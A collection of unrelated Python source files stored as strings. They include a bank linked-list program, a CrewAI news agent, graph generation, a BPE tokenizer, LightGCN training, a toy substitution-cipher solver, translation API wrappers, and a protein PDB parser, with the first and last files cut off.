    "import json\nfrom datetime import datetime\n\n\nclass Client:\n    def __init__(self, name, salary=0, log=[], date=None, next=None):\n        self.name = name\n        self.salary = salary\n        self.next = next\n        self.date_created = date if date else datetime.now()\n        self._log = log  # A queue of last 3 operation\n\n    def withdrawal(self, amount):\n        if amount <= 0:\n            print(\"Please, enter a positive value\")\n            return\n        if self.salary >= amount:\n            self.salary = self.salary - amount\n            print(f\"{amount}EGP withdrawn successfully\")\n            self.add_to_log(f\"{amount}EGP Withdrawn from your balance\")\n        else:\n            print(\"The requested amount exceeds your salary.\")\n\n    def deposit(self, amount):\n        if amount <= 0:\n            print(\"Please, enter a positive value\")\n            return\n        self.salary += amount\n        print(f\"{amount}EGP deposited successfully\")\n        self.add_to_log(f\"{amount}EGP deposited from your balance\")\n\n    def balance_inquiry(self):\n        print(f\"{self.name} has {self.salary}EGP\")\n\n    def add_to_log(self, data):\n        if len(self._log) > 2:\n            self._log.pop(0)\n        self._log.append(data)\n\n    def print_log(self):\n        if len(self._log) == 0:\n            print(\"No transaction made on salary\")\n        else:\n            for transaction in self._log:\n                print(transaction)\n\n    def __str__(self):\n        return self.name + f\" ({self.salary}EGP)  \" + \"Registered at \" + self.date_created.strftime(\"%H:%M %Y-%m-%d\")\n\n\nclass BankSystem:\n    # linked list\n    def __init__(self):\n        self.head = None\n\n    def print(self):\n        if self.head is None:\n            print(\"No currently clients!\")\n            return\n        itr: Client = self.head\n        displayed_text = ''\n        count = 1\n        while itr:\n            displayed_text += str(\n                count) + '- ' + itr.name + f\" ({itr.salary}EGP)  \" + \"Registered at \" + itr.date_created.strftime(\n                \"%H:%M %Y-%m-%d\") + '\\n'\n            itr = itr.next\n            count += 1\n        print(displayed_text)\n\n    def get_length(self):\n        count = 0\n        itr = self.head\n        while itr:\n            count += 1\n            itr = itr.next\n\n        return count\n\n    def insert_at_begining(self, name, salary=0, log=[]):\n        client = Client(name, salary, log, next=self.head)\n        self.head = client\n        print(f\"Client {name} has been added successfully\")\n\n    def insert_at_end(self, name, salary=0, date=None, log=[]):\n        if self.head is None:\n            self.head = Client(name=name, salary=salary, date=date, log=log, next=None)\n            return\n\n        itr = self.head\n\n        while itr.next:\n            itr = itr.next\n\n        itr.next = Client(name=name, salary=salary, log=log, date=date, next=None)\n        print(f\"Client {name} has been added successfully\")\n\n    def insert_at(self, index, name, salary=0, log=[]):\n        if index < 0 or index > self.get_length():\n            raise Exception(\"Invalid Index\")\n\n        if index == 0:\n            self.insert_at_begining(name, salary)\n            return\n\n        count = 0\n        itr = self.head\n        while itr:\n            if count == index - 1:\n                client = Client(name, salary, next=itr.next)\n                print(f\"Client {name} has been added successfully\")\n                itr.next = client\n                break\n\n            itr = itr.next\n            count += 1\n\n    def remove_at(self, index):\n        index = index - 1\n        if index < 0 or index >= self.get_length():\n            raise Exception(\"Invalid Index!\")\n\n        if index == 0:\n            self.head = self.head.next\n            return\n\n        count = 0\n        itr = self.head\n        while itr:\n            if count == index - 1:\n                itr.next = itr.next.next\n                print(f\"Client number {index + 1} has been removed successfully\")\n                break\n\n            itr = itr.next\n            count += 1\n\n    def select_at(self, index):\n        if self.head is None:\n            print(\"No currently clients!\")\n            return\n        elif index > self.get_length() + 1 or index < 1:\n            raise Exception(\"Invalid Index!\")\n\n        count = 0\n        itr = self.head\n        while itr:\n            if count == index - 1:\n                print(\"here\")\n                return itr\n\n            itr = itr.next\n            count += 1\n        return None\n\n    def insert_values(self, data_list):\n        self.head = None\n        for name, salary in data_list:\n            self.insert_at_end(name, salary)\n        print(f\"Clients have been added successfully\")\n\n    def insert_json_values(self, data: dict):\n        for client in data:\n            attrs = data[client]\n            date = datetime.fromisoformat(attrs[\"date_created\"])\n            self.insert_at_end(name=client,\n                               salary=attrs[\"salary\"],\n                               log=",
    "from crewai import Agent, Task, Crew, Process\n# from langchain_openai import ChatOpenAI\nfrom langchain_groq import ChatGroq\nfrom langchain.tools import tool\n# from langchain_community.document_loaders import WebBaseLoader\nimport os\nfrom langchain_community.tools import DuckDuckGoSearchRun\nfrom duckduckgo_search import DDGS\nfrom datetime import datetime\n\n# OPENAI_API_KEY = os.getenv(\"OPENAI_API_KEY\")\nGROQ_API_KEY = os.getenv(\"GROQ_API_KEY\")\nNEWS_API_KEY = os.getenv(\"NEWS_API_KEY\")\n\n@tool(\"News Searching Tool\")\ndef news_search_tool(query: str):\n    \"\"\"Search Internet for relevant information based on a query.\"\"\"\n    ddgs = DDGS()\n    results = ddgs.text(keywords=query, region='wt-wt', safesearch='moderate', max_results=5)\n    return results\n\n\nclass NewsAnalysisEngine:\n    def __init__(self):\n        # self.llm = ChatOpenAI(model=\"gpt-3.5-turbo\", api_key=OPENAI_API_KEY)\n        self.llm = ChatGroq(\n            temperature=0,\n            groq_api_key=GROQ_API_KEY,\n            model_name=\"mixtral-8x7b-32768\"\n        )\n\n\n    search_tool = DuckDuckGoSearchRun()\n\n    def analyze_news(self, query: str) -> str:\n        \"\"\"Analyze news articles based on the given query.\"\"\"\n        # news_analysis_engine = self\n\n        news_search_agent = Agent(\n            role='News Searcher',\n            goal='Generate key points for each news article from the latest news',\n            backstory='Expert in analysing and generating key points from news content for quick updates.',\n            tools=[news_search_tool, self.search_tool],\n            allow_delegation=True,\n            verbose=True,\n            llm=self.llm,\n            memory=True\n        )\n\n        writer_agent = Agent(\n            role='Writer',\n            goal='Identify all the topics received. Use the News search Tool to fetch the articles, then use the Search tool for detailed exploration of each topic. Summarise the retrieved information in depth for every topic.',\n            backstory='Expert in crafting engaging narratives from complex information.',\n            tools=[news_search_tool, self.search_tool],\n            allow_delegation=True,\n            verbose=True,\n            llm=self.llm,\n            memory=True\n        )\n        d = datetime.now().strftime(\"%Y-%m-%d\")\n        news_search_task = Task(\n            description=f'Search for {query} related news and articles and create key description for each news.',\n            agent=news_search_agent,\n            tools=[self.search_tool,news_search_tool],\n            expected_output=f\"Key points and description and Long summary for each news article related to {query}\"\n        )\n        \n        writer_task = Task(\n            description=f\"\"\"\n            Go step by step:\n            Step 1: Identify all the topics received and fetch news articles on todays Date :- {d}.\n            Step 2: Use the Search tool to search for information on each topic one by one.\n            Step 3: Go through every topic and write an in-depth long summary of the information retrieved no matter what it should be atleast 2000 words summary.\n            Step 4: Your final Report Should be A detailed research Article or blog on the News.\n            Final Step : You give A detailed and very long Report and make sure you give atleast 1-2 paragraphs of content on each topic you get \n            Don't skip any topic and Steps.\n            \"\"\",\n            agent=writer_agent,\n            context=[news_search_task],\n            tools=[self.search_tool,news_search_tool],\n            expected_output=\"detailed and very very long Report and make sure you give atleast 1-2 paragraphs of content on each topic\"\n        )\n\n        news_crew = Crew(\n            agents=[news_search_agent, writer_agent],\n            tasks=[news_search_task, writer_task],\n            process=Process.sequential,\n            manager_llm=self.llm\n        )\n\n        result = news_crew.kickoff()\n        return result\n\n# if __name__ == \"__main__\":\n#     engine = NewsAnalysisEngine()\n#     d = datetime.now().strftime(\"%Y-%m-%d\")\n#     result = engine.analyze_news(f\"AI advancements Related news on {d}\")\n#     print(result)\n",
    "# coding=utf-8\n# Copyright 2024 The Google Research Authors.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nr\"\"\"Random graph generation.\"\"\"\n\nfrom collections.abc import Sequence\nimport os\n\nfrom absl import app\nfrom absl import flags\nimport networkx as nx\nfrom tensorflow.io import gfile\n\nfrom graphqa import graph_generator_utils\n\n_ALGORITHM = flags.DEFINE_string(\n    \"algorithm\",\n    None,\n    \"The graph generating algorithm to use.\",\n    required=True,\n)\n_NUMBER_OF_GRAPHS = flags.DEFINE_integer(\n    \"number_of_graphs\",\n    None,\n    \"The number of graphs to generate.\",\n    required=True,\n)\n_DIRECTED = flags.DEFINE_bool(\n    \"directed\", False, \"Whether to generate directed graphs.\"\n)\n_OUTPUT_PATH = flags.DEFINE_string(\n    \"output_path\", None, \"The output path to write the graphs.\", required=True\n)\n_SPLIT = flags.DEFINE_string(\n    \"split\", None, \"The dataset split to generate.\", required=True\n)\n_MIN_SPARSITY = flags.DEFINE_float(\"min_sparsity\", 0.0, \"The minimum sparsity.\")\n_MAX_SPARSITY = flags.DEFINE_float(\"max_sparsity\", 1.0, \"The maximum sparsity.\")\n\n\ndef write_graphs(graphs, output_dir):\n  \"\"\"Writes graphs to output_dir.\"\"\"\n  if not gfile.exists(output_dir):\n    gfile.makedirs(output_dir)\n  for ind, graph in enumerate(graphs):\n    nx.write_graphml(\n        graph,\n        open(\n            os.path.join(output_dir, str(ind) + \".graphml\"),\n            \"wb\",\n        ),\n    )\n\n\ndef main(argv):\n  if len(argv) > 1:\n    raise app.UsageError(\"Too many command-line arguments.\")\n\n  if _SPLIT.value == \"train\":\n    random_seed = 9876\n  elif _SPLIT.value == \"test\":\n    random_seed = 1234\n  elif _SPLIT.value == \"valid\":\n    random_seed = 5432\n  else:\n    raise NotImplementedError()\n\n  generated_graphs = graph_generator_utils.generate_graphs(\n      number_of_graphs=_NUMBER_OF_GRAPHS.value,\n      algorithm=_ALGORITHM.value,\n      directed=_DIRECTED.value,\n      random_seed=random_seed,\n      er_min_sparsity=_MIN_SPARSITY.value,\n      er_max_sparsity=_MAX_SPARSITY.value,\n  )\n  write_graphs(\n      graphs=generated_graphs,\n      output_dir=os.path.join(\n          _OUTPUT_PATH.value,\n          _ALGORITHM.value,\n          _SPLIT.value,\n      ),\n  )\n\n\nif __name__ == \"__main__\":\n  app.run(main)\n",
    "# # # # # # We are learning Python\n\n# # # # # \"\"\" a = 10\n# # # # # b = 5\n# # # # # c = 11\n\n# # # # # print(a,c)\n# # # # # print(a, c) \"\"\"\n\n\n# # # # # # Escape Seaquence Words \n\n# # # # # # This is a list of proucts:\n# # # # # # Mobiles\n# # # # # # Laptops\n\n# # # # # # Use of \\n (for break line or new line)\n# # # # # print(\"This is a list of proucts:\\n Mobiles \\nLaptops \")\n\n# # # # # # Use of \\t (for extra space like 4)\n# # # # # # word1    word2\n# # # # # print(\"word1\\tword2\")\n\n# # # # # # Use of \\ (for uniqe words)\n# # # # # # omege code u03A9\n\n# # # # # # Befor \\\n# # # # # print(\"u03A9\")\n\n# # # # # # After \\\n# # # # \"\"\" print(\"\u03a9\")\n# # # # print(\"\\u03A9\")\n# # # # print(\"\\u03A9\")\n# # # # print(\"\\u03A9\")\n# # # # print(\"\\u03A9\") \"\"\"\n\n# # # # print(\"Quid said: \\\"Work, work and work\\\"\")\n\n\n# # # a = 10    #interger\n# # # b = \"Hello\"\n\n# # # print(b)\n# # # print(\"b\")\n\n\n# # # Type Casting\n# # #with decimal(Integer)      without decimal(float)\n\n# # a = 45.67\n# # print(\"Float Data Type\", a)\n\n# # b = int(a)\n# # print(\"Integer Data Type\", b)\n\n# # print(a - b)\n\n# # # c = str(a)\n# # # print(\"String Data Type\", c)\n\n\n# # How to check type of a variable/value\n# a = 23.45\n# b = 45\n# c = \"H\"\n# d = \"Hello\"\n\n# print(type(a))\n# print(type(b))\n# print(type(c))\n# print(type(d))",
    "# 2.1 Realizar una funci\u00f3n que calcule el descuento en la compra de acuerdo a su valor.\n\nCompra=int(input(\"Buenos dias, ingrese el monto de compra \"))\n\nif Compra >= 500:\n    pago=Compra*0.90\n    print (\"Usted debe abonar $ \", pago)\n\nelse: \n    pago=Compra*0.95\n    print (\"Usted debe abonar $ \", pago)\n\n#2.2 Crear una funci\u00f3n llamada \"calcular_area_circulo\" que reciba el radio de un c\u00edrculo como argumento y calcule y devuelva el \u00e1rea del c\u00edrculo. Les recuerdo que el \u00e1rea de un c\u00edrculo se calcula con la f\u00f3rmula: \u00e1rea = pi * radio^2 y pi tiene un valor aproximado de 3.141592. No olviden pensar los tipos de datos que se utilizar\u00e1n y escribir el Docstring correspondiente.\n\n\nradio=int(input(\"ingrese el valor del radio \"))\n\ndef calcular_area_circulo(radio):\n    pi=3.141592\n    area= pi* (radio**2)\n    return area\n    \n\narea= calcular_area_circulo(radio)\nprint(f\"el area del circulo con un radio de {radio} cm, es de {area} cm\")\n\n#Una estaci\u00f3n meteorol\u00f3gica, informa la direcci\u00f3n del viento con una codificaci\u00f3n num\u00e9rica del 0 al 7 para representar las diferentes direcciones del viento de la siguiente manera:\n#Crear una funci\u00f3n que reciba el n\u00famero de direcci\u00f3n del viento y lo traduzca en una cadena de texto correspondiente a la direcci\u00f3n real. Esta cadena de texto deber\u00e1 ser impresa en pantalla para que los operadores puedan leerla f\u00e1cilmente.\n#Recuerda utilizar nombres descriptivos para tu funci\u00f3n y las variables que utilices\n\ndireccionViento={\n    \"0\":\"Norte\",\n\t\"1\":\"Noreste\",\n\t\"2\":\"Este\",\n\t\"3\":\"Sureste\",\n\t\"4\":\"Sur\",\n\t\"5\":\"Suroeste\",\n\t\"6\":\"Oeste\",\n\t\"7\":\"Noroeste\"\n}\n\ndef codifNumerica(valor):\n    return direccionViento.get(valor, \"valor no corresponde con ningun valor de la estacion\")\n\nvalor = str(input(\"ingrese uno de los numeros correspondientes a la siguiente codificacion numerica, para optener la direccion del viento\")) \nprint (f\"La direccion del viento es {codifNumerica(valor):}\")\n\n#La estaci\u00f3n meteorol\u00f3gica, registra la velocidad del viento en diferentes momentos del d\u00eda. Se desea calcular la velocidad promedio del viento para publicarla en una p\u00e1gina web.\n#Para esto, crear una funci\u00f3n llamada \"calcular_velocidad_promedio\" que reciba una lista de velocidades del viento y devuelva la velocidad promedio. La velocidad del viento se expresa en metros por segundo.\n\nIngreso_registro_velocidades = input(\"Ingrese las velocidades registradas en valores de 3 d\u00edgitos, completando los d\u00edgitos primeros con 0 de ser menor que 100 Km/h: \")\nvelocidades_del_viento = [Ingreso_registro_velocidades[i:i+3] for i in range(0, len(Ingreso_registro_velocidades), 3)]\nvelocidades_del_viento = [int(v) for v in velocidades_del_viento]\n\n\nprint(velocidades_del_viento)\n\ndef calcular_velocidad_promedio(velocidades_del_viento):\n    velocidad_promedio=(sum(velocidades_del_viento))/(len(velocidades_del_viento))\n    return velocidad_promedio\n\nvelocidad_promedio=calcular_velocidad_promedio(velocidades_del_viento)\nprint (f\"Le valocidad promedio, en pos de los valores ingresados es de {velocidad_promedio} km/h\")\n\n#2.5 La estaci\u00f3n tambi\u00e9n informa el porcentaje de carga de su bater\u00eda interna. Crear una funci\u00f3n llamada \"estado_bateria\" que reciba un n\u00famero entero que representa el porcentaje de carga de la bater\u00eda y devuelva un mensaje indicando el estado actual de la bater\u00eda.\n\ncarga_bateria=int(input(\"Ingrese el valor de carga de su bateria en este momento: \"))\n\ndef estado_bateria(carga_bateria):\n    if carga_bateria >= 80:\n        estado=\"Cargada\" \n    elif 30 <= carga_bateria >= 79:\n        estado=(\"Carga media\")\n    elif carga_bateria <= 29:\n        estado=(\"Carga baja, REEMPLAZAR\") \n    else:\n        estado= \"Error\" \n    return estado\n\nestado_carga_bateria=estado_bateria(carga_bateria)\nprint(f\"actualmente su bateria se encuentra {estado_carga_bateria}\")\n",
    "import torch\nimport torch.nn as nn\nfrom torch.nn import functional as F\nimport pandas as pd\n\n#imported data\n\ndf = pd.read_csv(\"text.csv\")\ntext = df[\"text\"].str.cat(sep=\"\\n\")\n# print(\"Length of text : \",len(text))\n\n\n#already existed char level encoder with vocab size of 256\n\n# tokens1 = text.encode(\"utf-8\") #it encoded char to integer from 0 to 255 with vocab size of 256\n# tokens1 = list(map(int , tokens1)) \n# #utf encoding is just another character level encoding with a vocab size of 256 .......i.e\n# #it contains 255 different characters in its vocab\n# print(len(tokens1), \"for utf-8\")\n# #a start from 97\n#z is at 122\n# print(chr(122))\n\n# print(chr(0) , chr(1) , chr(2) , chr(3) , chr(4) ,\" ...............\" , chr(256))\n\n\n#our created encoder with vocab size of 28\nchars = sorted(list(set(text)))\nvocab_size = len(chars)\n# print(\"Size of vocab : \",vocab_size)\n\nstoi = { ch:i for i,ch in enumerate(chars) }\nitos = { i:ch for i,ch in enumerate(chars) }\nencode = lambda s: [stoi[c] for c in s]\ndecode = lambda l: ''.join([itos[i] for i in l]) \n\ntokens = list(encode(text)) #it encoded char to integer from 0 to 27 with vocab size of 28\nprint(len(tokens) , \"our version\")\n# print(encode(\"e\"))\n# print(chars)\n# print(decode([27]))\n\nprint(\"inital\")\nprint(stoi)\nprint(itos)\n\n\n#function to find the frequency of frequent consecutive pairs \ndef get_stats(ids):\n    counts = {}\n    for pair in zip(ids, ids[1:]): # Pythonic way to iterate consecutive elements\n        counts[pair] = counts.get(pair, 0) + 1\n    return counts\n\n#utf-8\n# stats1 = get_stats(tokens1)\n\n# #the one we made\n# stats = get_stats(tokens)\n\n# print(\"utf-8\")\n# print(sorted(((v,k) for k,v in stats1.items()), reverse=True))\n\n# print(\"our version\")\n# print(sorted(((v,k) for k,v in stats.items()), reverse=True))\n\n\n# print(\"utf-8\")\n\n# top_pair1 = max(stats1, key=stats1.get)\n# print(top_pair1)\n\n# print(\"our version\")\n\n# top_pair = max(stats, key=stats.get)\n# print(top_pair)\n\ndef merge(ids, pair, idx):\n  # in the list of ints (ids), replace all consecutive occurences of pair with the new token idx\n  newids = []\n  i = 0\n  while i < len(ids):\n    # if we are not at the very last position AND the pair matches, replace it\n    if i < len(ids) - 1 and ids[i] == pair[0] and ids[i+1] == pair[1]:\n      newids.append(idx)\n      i += 2\n    else:\n      newids.append(ids[i])\n      i += 1\n  return newids\n\n#utf-8\n# max_vocab1 = 280 \n# num_merges1 = max_vocab1 - 256\n# new_list1 = list(tokens1)\n\n# merges1 = {}\n# for i in range(num_merges1):\n#     new_count = get_stats(new_list1)\n#     pair = max(new_count , key=new_count.get)\n#     idx = 256 + i\n#     print(f\"merging {pair} into a new token {idx}\")\n#     new_list1 = merge(new_list1 , pair , idx)\n#     merges1[pair] = idx\n\n    \n#our version\n  \nmax_vocab = 31 \nnum_merges = max_vocab - 28\nnew_list = list(tokens)\n\nmerges = {}\nfor i in range(num_merges):\n    new_count = get_stats(new_list)\n    pair = max(new_count , key=new_count.get)\n    idx = 28 + i\n    print(f\"merging {pair} into a new token {idx}\")\n    new_list = merge(new_list , pair , idx)\n    merges[pair] = idx\n    \nprint(merges)\n\nfor key, value in merges.items():\n    var1 , var2 = key\n    new_var1 = decode([var1])\n    new_var2 = decode([var2])\n    new_idx = new_var1+new_var2\n    itos[value] = new_idx\n\nprint(itos)\n\nprint(decode([30]))\n    \n    \n    \n\n\n\n\n\n\n",
    "import os\nimport sys\n\n# Get the parent directory path\nparent_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))\n# Append the parent directory to sys.path for relative imports\nsys.path.append(parent_dir)\n\nimport settings as s\nfrom utils import seed_everything\n\nimport torch\nimport pandas as pd\nfrom torch_geometric.nn import LightGCN\nfrom tqdm import tqdm\n\ndef train(model, optimizer, train_edges, train_loader, device):\n    \"\"\"Train the model.\"\"\"\n    total_loss = total_examples = 0\n\n    for index in train_loader:\n        pos_edge_label_index = train_edges[:, index]\n        \n        neg_edge_label_index = torch.stack([\n            pos_edge_label_index[0],\n            torch.randint(num_users, num_users + num_news,\n                          (index.numel(), ), device=device)\n        ], dim=0)\n        \n        edge_label_index = torch.cat([pos_edge_label_index, neg_edge_label_index], dim=1)\n        \n        optimizer.zero_grad()\n        pos_rank, neg_rank = model(train_edges, edge_label_index).chunk(2)\n        \n        loss = model.recommendation_loss(pos_rank, neg_rank, node_id=edge_label_index.unique())\n        loss.backward()\n        optimizer.step()\n\n        total_loss += float(loss) * pos_rank.numel()\n        total_examples += pos_rank.numel()\n\n    return total_loss / total_examples\n\nif __name__ == \"__main__\":\n    # Set seed and device\n    seed_everything(s.seed)\n    device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\n    print(f\"Device: '{device}'\")\n\n    # Load edges data and create DataLoader\n    train_edges = torch.load(s.gnn_edges_path).to(device)\n    train_loader = torch.utils.data.DataLoader(torch.arange(train_edges.shape[1]), shuffle=True, batch_size=s.gnn_batch_size)\n\n    num_users = train_edges[0].unique().size(0)\n    num_news = train_edges[1].unique().size(0)\n\n    # Initialize model and optimizer\n    model = LightGCN(num_nodes=num_users+num_news, **s.gnn_params).to(device)\n    optimizer = torch.optim.Adam(model.parameters(), lr=0.01)\n\n    # Train the model\n    for epoch in tqdm(range(1, s.gnn_train_epochs+1)):\n        loss = train(model, optimizer, train_edges, train_loader, device)\n\n        if epoch % 2 == 0:\n            print(f'Epoch: {epoch:03d}, Loss: {loss:.4f}')\n\n    # Extract and save user embeddings\n    user_embeddings = model.get_embedding(train_edges)[:num_users].detach().cpu()\n    pd.DataFrame(user_embeddings.numpy()).add_prefix('user_').to_parquet(s.user_embedding_path)",
    "#!/usr/bin/python3\n#@author: Github.com/syedalizain033  \nfrom pypdf import PdfReader #download via pip3 install pypdf\n\ndef prob_finder(dist,total):\n    dist_percentage = {char: round((count / total) * 100) for char, count in dist.items()}\n    dist_percentage=dict(sorted(dist_percentage.items(), key=lambda x: x[1], reverse=True))\n    return dist_percentage\n    # counter=0\n    # # for i,j in dist_percentage.items():\n    # #     counter+=j\n    # # print(counter)\n\ndef dist_gen(text):\n    dist={}\n    for i in text:\n        if i in dist:\n            dist[i]=dist[i]+1\n        else:\n            dist[i]=1\n    return dist\n\ndef wordcounter(pdf,text=\"\"):\n    content=PdfReader(pdf)\n    for i in range(len(content.pages)):\n        data=content.pages[i]\n        text=text+data.extract_text()\n    text=text.lower().replace(\" \",\"\").replace(\"\\n\",\"\").replace(\"'\",\"\").replace(\"'\",\"\").replace(\"/\",\"\").replace(\"-\",\"\").replace(\",\",\"\").replace(\"!\",\"\").replace(\".\",\"\").replace(\"`\",\"\").replace(\"\u2019\",\"\").replace(\"\u2018\",\"\").replace(\":\",\"\")\n    # print(text)\n    dist=dist_gen(text)\n    # print(dist)\n    return prob_finder(dist,len(text))\n    \n\ndef crack(dist, cipher):\n    decrypted_text = ''\n    enc_dist=prob_finder(dist_gen(cipher),len(cipher))\n    enc_dist=dict(sorted(enc_dist.items(), key=lambda x: x[1], reverse=True))\n\n    c=0\n    x=[x for x,y in enc_dist.items()]\n    i=[i for i,y in dist.items()]\n    print(cipher)\n    for j in range(len(x)):\n        try:\n            if x[c]==' ':\n                continue\n            cipher=cipher.replace(x[c],i[c])\n            print(cipher)\n            c+=1\n        except: break\n        \n    print(cipher)\n\ndef main():\n    pdf=\"file.pdf\"\n    dist=wordcounter(pdf)\n    # print(dist)\n    cipher=\"ybklypdyg byy\"\n    crack(dist,cipher)\n\nmain()",
    "import deepl\nimport json\nfrom deep_translator import GoogleTranslator as GT\nimport sys\nimport requests, uuid\n\nclass GoogleTranslator:\n    def __init__(self, source_lang=\"en\", target_lang=\"pt-pt\"):\n        self\n        self.auth_key = \"KEY\"\n        self.translator_google = GT(source=source_lang, target= target_lang)\n\n\n    def translate(self, text):\n        trans = self.translator_google.translate(text+ \" \")\n        if trans:\n            trans = trans.strip()\n        else:\n            trans = text\n        return trans\n\nclass DeepLTranslator:\n    def __init__(self,auth_key, source_lang=\"EN\", target_lang=\"PT-PT\"):\n        self.auth_key = \"KEY\"\n        self.source_lang = source_lang\n        self.target_lang = target_lang\n        self.translator = deepl.Translator(auth_key)\n        \n    def translate(self, text):\n        result = self.translator_deepl.translate_text(text, source_lang= self.ource_lang, target_lang= self.target_lang)\n        return result.text.strip()\n        \n\n\nclass MicrosoftTranslator:\n    def __init__(self,auth_key, source_lang=\"en\", target_lang=\"pt-pt\"):\n        self.source_lang = source_lang\n        self.target_lang = target_lang\n        self.auth_key = auth_key\n\n    def DictionaryLookup(self, word):\n        # Add your key and endpoint\n        key = self.auth_key\n        endpoint = \"https://api.cognitive.microsofttranslator.com\"\n\n        # location, also known as region.\n        # required if you're using a multi-service or regional (not global) resource. It can be found in the Azure portal on the Keys and Endpoint page.\n        location = \"westeurope\"\n\n        #path = '/translate?api-version=3.0'\n        path = '/dictionary/lookup?api-version=3.0'\n        constructed_url = endpoint + path + \"&includeAlignment=true\"\n\n        params = {\n            'from': self.source_lang,\n            'to': self.target_lang\n        }\n\n        headers = {\n        'Ocp-Apim-Subscription-Key': key,\n        # location required if you're using a multi-service or regional (not global) resource.\n        'Ocp-Apim-Subscription-Region': location,\n        'Content-type': 'application/json',\n        'X-ClientTraceId': str(uuid.uuid4()),\n\n        }\n\n        body = [{\n            'Text': word\n        }]\n\n        request = requests.post(constructed_url, params=params, headers=headers, json=body)\n        response = request.json()\n        return response[0][\"translations\"]\n    \n    def getMultipleTranslations(self, word):\n        translations = self.DictionaryLookup(word)\n        #print(translations)\n        translations = [trans[\"displayTarget\"] for trans in translations]\n        return translations\n    \n    def translate(self, word):\n        # Add your key and endpoint\n        key = self.auth_key\n\n        endpoint = \"https://api.cognitive.microsofttranslator.com\"\n\n        # location, also known as region.\n        # required if you're using a multi-service or regional (not global) resource. It can be found in the Azure portal on the Keys and Endpoint page.\n        location = \"westeurope\"\n\n        path = '/translate?api-version=3.0'\n        constructed_url = endpoint + path #+ \"&includeAlignment=true\"\n\n        params = {\n            'from': self.source_lang,\n            'to': self.target_lang\n        }\n\n        headers = {\n        'Ocp-Apim-Subscription-Key': key,\n        # location required if you're using a multi-service or regional (not global) resource.\n        'Ocp-Apim-Subscription-Region': location,\n        'Content-type': 'application/json',\n        'X-ClientTraceId': str(uuid.uuid4()),\n\n        }\n\n        # You can pass more than one object in body.\n        body = [{\n            'Text': word\n        }]\n\n        request = requests.post(constructed_url, params=params, headers=headers, json=body)\n        response = request.json()\n\n        return response[0][\"translations\"][0][\"text\"].strip()\n",
    "#!/usr/bin/python3\n# Gruppe 03\n# ProgPra WS2324\nimport argparse\nimport math\nimport requests\nimport matplotlib.pyplot as plt\nimport numpy as np\nimport matplotlib.colors as mcolors\n\nATOM_TYPE_POS = (12, 16)\nPOSITION = (22, 26)\nCHAIN_POS = 21\nAA_POS = (17, 20)\nX_COORD = (30, 38)\nY_COORD = (38, 46)\nZ_COORD = (46, 54)\nAA_ID = (22, 26)\nATOM_ID = (6, 11)\nHELIX_SEQ_START = (21, 25)\nHELIX_SEQ_END = (33, 37)\nHELIX_CHAIN = 19\nSHEET_SEQ_START = (22, 26)\nSHEET_SEQ_END = (33, 37)\nSHEET_CHAIN = 21\n\nAA_DICT = {\n    \"ALA\": \"A\", \"ARG\": \"R\", \"ASN\": \"N\", \"ASP\": \"D\", \"CYS\": \"C\",\n    \"GLU\": \"E\", \"GLN\": \"Q\", \"GLY\": \"G\", \"HIS\": \"H\", \"ILE\": \"I\",\n    \"LEU\": \"L\", \"LYS\": \"K\", \"MET\": \"M\", \"PHE\": \"F\", \"PRO\": \"P\",\n    \"SER\": \"S\", \"THR\": \"T\", \"TRP\": \"W\", \"TYR\": \"Y\", \"VAL\": \"V\"\n}\n\n\ndef get_file_info(id_path, type):\n    \"\"\"\n    Parse PDB File\n    Extract Atom information\n    :return: Dict with the positions of the atoms as keys\n    \"\"\"\n    counter = 0\n    atom_info = {}\n    ss_info = {}\n    with open(id_path, 'r') as pdb_file:\n        for line in pdb_file:\n            if line.startswith('HELIX'):  # Get Secondary Structure-Infos for Helix\n                helix_start = int(line[HELIX_SEQ_START[0]:HELIX_SEQ_START[1]].strip())\n                helix_end = int(line[HELIX_SEQ_END[0]:HELIX_SEQ_END[1]].strip())\n                helix_chain = line[HELIX_CHAIN]\n                ss_info[(helix_chain, helix_start, helix_end)] = {'H'}\n            if line.startswith('SHEET'):  # Get Secondary Structure-Infos for Sheet, else C\n                sheet_start = int(line[SHEET_SEQ_START[0]:SHEET_SEQ_START[1]].strip())\n                sheet_end = int(line[SHEET_SEQ_END[0]:SHEET_SEQ_END[1]].strip())\n                sheet_chain = line[SHEET_CHAIN]\n                ss_info[(sheet_chain, sheet_start, sheet_end)] = {'E'}\n            if line.startswith('ATOM'):  # Extract Atom Info\n                atom_type = line[ATOM_TYPE_POS[0]:ATOM_TYPE_POS[1]].strip()\n                if atom_type == type:  # For Atoms with required Atom Type\n                    chain = line[CHAIN_POS]\n                    position = int(line[POSITION[0]:POSITION[1]].strip())\n                    aa = line[AA_POS[0]:AA_POS[1]].strip()\n                    atom_id = line[ATOM_ID[0]:ATOM_ID[1]]\n                    # Get coordinates\n                    x_coord = float(line[X_COORD[0]:X_COORD[1]])\n                    y_coord = float(line[Y_COORD[0]:Y_COORD[1]])\n                    z_coord = float(line[Z_COORD[0]:Z_COORD[1]])\n                    # Create Atom_info Dict with Atom-Info-Lists as Values:\n                    atom_info[atom_id] = (chain, position, atom_type, aa, x_coord, y_coord, z_coord)\n            if line.startswith('MODEL'):\n                counter += 1\n                if counter == 2:\n                    break\n    max_value = atom_info[list(atom_info.keys())[-1]][1]\n    return atom_info, ss_info, max_value\n\n\ndef calc_distance(atom_i, atom_j):\n    # Read coordinates of both atoms (x1,x2,x3) (y1,y2,y3)\n    i1 = atom_i[4]\n    i2 = atom_i[5]\n    i3 = atom_i[6]\n    j1 = atom_j[4]\n    j2 = atom_j[5]\n    j3 = atom_j[6]\n    # Return Matrixnorm of [x, y]\n    return math.sqrt((j1 - i1) ** 2 + (j2 - i2) ** 2 + (j3 - i3) ** 2)\n\n\ndef get_sec_struct(ss_info, atom_info):\n    \"\"\"\n    :param ss_info with keys (chain name, start_pos, end_pos)\n    :param atom_info of current position\n    :return: current secondary structure\n    \"\"\"\n    for key in ss_info:\n        if key[0] == atom_info[0] and key[1] <= atom_info[1] <= key[2]:\n            if ss_info[key] == {'H'}:\n                return 'H'\n            else:\n                return 'E'\n    return 